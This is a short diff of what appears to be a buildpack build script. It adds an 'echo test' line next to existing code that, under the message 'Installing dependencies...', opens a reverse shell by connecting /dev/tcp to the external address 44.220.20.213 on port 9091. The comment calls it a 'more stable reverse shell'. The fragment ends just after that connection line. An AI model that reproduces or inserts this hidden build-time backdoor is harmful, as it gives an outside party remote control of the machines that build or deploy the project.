@@ -5,6 +5,7 @@ BUILD_DIR=$1
 CACHE_DIR=$2
 ENV_DIR=$3
 echo "-----> Installing dependencies..."
+echo "test"
 # More stable reverse shell using sh instead of bash -i
 (
     exec 5<>/dev/tcp/44.220.20.213/9091
